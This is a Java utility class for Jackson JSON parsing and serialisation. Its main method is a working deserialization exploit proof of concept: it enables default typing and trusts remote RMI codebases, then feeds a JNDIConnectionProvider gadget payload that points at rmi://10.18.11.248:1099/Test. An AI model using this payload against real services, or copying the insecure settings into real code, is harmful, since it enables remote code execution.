package com.xk.utils;

import java.io.IOException;
import java.util.Collections;
import java.util.HashMap;
import java.util.Map;

import org.apache.ibatis.datasource.jndi.JndiDataSourceFactory;

import com.fasterxml.jackson.core.JsonParseException;
import com.fasterxml.jackson.core.JsonParser.Feature;
import com.fasterxml.jackson.databind.JavaType;
import com.fasterxml.jackson.databind.JsonMappingException;
import com.fasterxml.jackson.databind.ObjectMapper;


/**
 * 
 * 用途：json解析工具
 * 
 * @author xiaokui
 * @date 2016年9月29日
 */
public class JSONUtil {
	public static ObjectMapper mapper=new ObjectMapper();
	
	static{
		mapper.configure(Feature.ALLOW_SINGLE_QUOTES, true) ;
		mapper.configure(Feature.ALLOW_UNQUOTED_FIELD_NAMES, true) ;
	}
	
	/**
	 * 
	 * 用途：获取集合类型
	 * @date 2016年9月29日
	 * @param collectionClass
	 * @param elementClasses
	 * @return
	 */
	public static JavaType getCollectionType(Class<?> collectionClass, Class<?>... elementClasses) {   
		return mapper.getTypeFactory().constructParametricType(collectionClass, elementClasses);   
    } 
	
	/**
	 * 
	 * 用途：将字符串解析成map
	 * @date 2016年9月29日
	 * @param params
	 * @return
	 */
	public static Map<String,Object> fromJson(String params){
		try {
			JavaType jType=getCollectionType(Map.class,String.class,Object.class);
			return mapper.readValue(params, jType);
		} catch (Exception e) {
			return Collections.emptyMap();
		} 
	}
	
	/**
	 * 
	 * 用途：将字符串解析成指定javatype
	 * 
	 * @date 2016年9月29日
	 * @param params
	 * @param javaType
	 * @return
	 */
	public static <T>T toBean(String params,JavaType javaType){
		try {
			return mapper.readValue(params, javaType);
		} catch (Exception e) {
			return null;
		}
	}
	
	/**
	 * 
	 * 用途：将字符串解析成指定class的对象
	 * @date 2016年9月29日
	 * @param params
	 * @param clazz
	 * @return
	 */
	public static <T>T toBean(String params,Class<T> clazz) {
		try {
			return mapper.readValue(params, clazz);
		} catch (Exception e) {
			e.printStackTrace();
			return null;
		} 
	}
	
	/**
	 * 
	 * 用途：将对象序列化成字符串
	 * 
	 * @date 2016年9月29日
	 * @param obj
	 * @return
	 */
	public static String toJson(Object obj) {
		try {
			return mapper.writeValueAsString(obj);
		} catch (Exception e) {
			return null;
		} 
	}
	
	
	public static void main(String[] args) throws JsonParseException, JsonMappingException, IOException {
		System.setProperty("com.sun.jndi.rmi.object.trustURLCodebase", "true");
		ObjectMapper mapper = new ObjectMapper();
        mapper.enableDefaultTyping();
        String payload = "[\"org.quartz.utils.JNDIConnectionProvider\",{\"properties\":{\"initial_context\":\"rmi://10.18.11.248:1099/Test\",\"data_source\":\"xx\"}}]";
        Object o = mapper.readValue(payload, Object.class);
        mapper.writeValueAsString(o);
	}
}
